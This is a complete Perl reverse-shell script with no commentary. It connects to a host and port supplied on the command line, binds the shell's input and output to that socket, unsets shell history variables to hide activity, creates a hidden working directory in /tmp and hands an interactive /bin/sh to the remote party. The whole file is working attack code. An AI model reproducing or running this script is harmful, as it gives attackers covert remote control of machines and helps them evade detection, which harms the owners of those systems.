#!/usr/bin/perl 
use IO::Socket; 
$system    = '/bin/sh'; 
$ARGC=@ARGV;  
use Socket;  
use FileHandle;  
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "unable to resolve host\n";  
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "unable to connect\n";  
print "[*] resolving hostname\n"; 
print "[*] connecting... $ARGV[0] \n";  
print "[*] SPAWNING SHELL\n"; 
SOCKET->autoflush();  
open(STDIN, ">&SOCKET");  
open(STDOUT,">&SOCKET");  
open(STDERR,">&SOCKET");  
system("unset HISTFILE; unset SAVEHIST; echo [*] KERNEL version; uname -a; echo [*] creating /tmp/.XputYGJL; mkdir /tmp/.XputYGJL; cd /tmp/.XputYGJL; echo [*] current dir; pwd; echo enjoy ");  
system($system); 
#EOF  